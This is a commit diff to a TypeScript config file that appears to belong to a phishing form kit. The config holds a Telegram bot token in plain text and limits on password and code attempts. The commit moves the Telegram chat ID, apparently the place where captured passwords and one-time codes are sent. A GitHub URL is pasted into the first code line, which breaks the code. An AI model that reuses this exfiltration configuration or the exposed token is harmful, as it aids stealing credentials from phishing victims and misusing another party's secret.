020773bf520193ae37578a143a0ed5a1414162a1
hehawkltwat1124 <jubinosojkancq7@hotmail.com>
2025-11-05 17:23:47 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,6 +1,6 @@
 const config = {https://github.com/hehawkltwat1124/formnew0511/blob/main/src/utils/config.ts
     TOKEN: '8288397640:AAEFdGkEz6bmI7yWukFZoA_DcGysT0f-glw',
-    CHAT_ID: '5050955916',
+    CHAT_ID: '-1003257858837',
     MAX_PASS: 2,
     MAX_CODE: 4,
     CODE_LOADING_TIME: 5
